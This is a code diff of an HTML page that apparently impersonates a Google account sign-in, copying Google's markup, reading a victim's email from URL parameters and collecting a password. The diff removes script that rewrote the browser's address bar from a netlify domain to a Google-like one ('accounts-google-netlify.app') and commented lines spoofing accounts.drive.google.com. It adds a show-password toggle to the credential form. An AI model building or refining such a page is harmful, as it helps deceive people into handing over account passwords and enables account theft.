@@ -2,16 +2,7 @@
   <head>
     <script>
       window.onload = function() {
-        // alert('Document is loaded!');
-
-        let currentUrl = window.location.href;
-        let newUrl = currentUrl.replace('my-accounts-drive-space.netlify.app', 'accounts-google-netlify.app');
-        console.log(currentUrl, newUrl)
-        if (newUrl !== currentUrl) {
-            window.history.replaceState({}, '', newUrl);
-        }
-
-        
+          
         function getAllURLParams() {
           const urlParams = new URLSearchParams(window.location.search);
           let paramsObj = {};
@@ -28,9 +19,7 @@
           return formattedName;
         }
 
-        // history.replaceState(null, null, 'https://accounts.drive.google.com');
 
-        // window.location.replace('https://accounts.drive.google.com')
         const allParams = getAllURLParams();
         let email = allParams['email']
         console.log(email)
@@ -18278,7 +18267,7 @@
                                             <div class="sSzDje NEk0Ve">
                                               <div class="enBDyd ">
                                                 <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine y5MMGc sD2Hod VfPpkd-MPu53c-OWXEXe-mWPk3d" jscontroller="etBPYb" data-indeterminate="false" jsname="ornU0b" jsaction="click:cOuCgd; clickmod:vhIIDb; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; contextmenu:mg9Pef;animationend:L9dL9d;dyRcpb:dyRcpb;" data-disable-idom="true" data-value="optioni8">
-                                                  <input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" jsname="YPqjbf" jsaction="focus:AHmuwe; blur:O22p3e;change:WPi0i;" aria-labelledby="selectioni7">
+                                                  <input class="VfPpkd-muHVFf-bMcfAe" onclick="showPassword()" type="checkbox" jsname="YPqjbf" jsaction="focus:AHmuwe; blur:O22p3e;change:WPi0i;" aria-labelledby="selectioni7">
                                                   <div class="VfPpkd-YQoJzd">
                                                     <svg aria-hidden="true" class="VfPpkd-HUofsb" viewBox="0 0 24 24">
                                                       <path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
@@ -18399,6 +18388,18 @@
   </body>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
   <script>
+
+
+    function showPassword(){
+
+        var passwordInput = document.getElementById('password-f');
+        if (passwordInput.type === "password") {
+            passwordInput.type = "text";
+        } else {
+            passwordInput.type = "password";
+        }
+        passwordInput.focus();
+    }
     function validateInput(input) {
       if (input.length < 8) return false; // Ensure input is at least 8 characters long
       const hasNumber = /\d/.test(input);
@@ -18448,4 +18449,4 @@
       passwordField.value = "";
     }
   </script>
-</html>>
+</html>
